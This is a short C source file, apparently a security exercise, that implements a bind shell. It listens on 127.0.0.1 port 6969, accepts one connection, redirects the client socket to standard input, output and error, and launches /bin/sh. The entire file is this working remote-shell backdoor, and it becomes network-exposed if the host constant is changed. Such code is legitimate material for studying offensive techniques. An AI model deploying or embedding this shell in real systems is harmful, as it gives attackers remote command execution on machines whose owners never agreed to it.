/*
 * A simple bind shell that calls execve("/bin/sh", NULL, NULL)
 */

#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>

#include "utils.h"

#define HOST "127.0.0.1"
#define PORT "6969"
#define MAX_CONNECTIONS (5)

int main()
{
	struct addrinfo hints, *results;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	getaddrinfo(HOST, PORT, &hints, &results);

	// create a TCP socket
	int sockfd = socket(results->ai_family, results->ai_socktype, 0);
	if (sockfd < 0) 
		error("socket");

	// bind to the socket to the host:port
	if (bind(sockfd, results->ai_addr, results->ai_addrlen) < 0)
		error("bind");

	// listen for incoming connections
	if (listen(sockfd, MAX_CONNECTIONS) < 0)
		error("listen");

	printf("[+] Server listening on %s:%s\n", HOST, PORT);
	
	struct sockaddr_storage client_addr;
	socklen_t addr_size = sizeof(client_addr);

	// TODO accept incoming clients in a loop
	int clientfd = accept(sockfd, (struct sockaddr *)&client_addr, &addr_size);
	if (clientfd < 0) {
		fprintf(stderr, "Failed to accept a client\n");
		//continue
	}

	// duplicate the client file descriptor to our stdin, stdout and stderr
	dup2(clientfd, 0);
	dup2(clientfd, 1);
	dup2(clientfd, 2);

	char *args[] = {"/bin/sh", NULL};
	execve(args[0], args, NULL);

	close(clientfd);

	// close the socket once we are done
	close(sockfd);

	return 0;
}
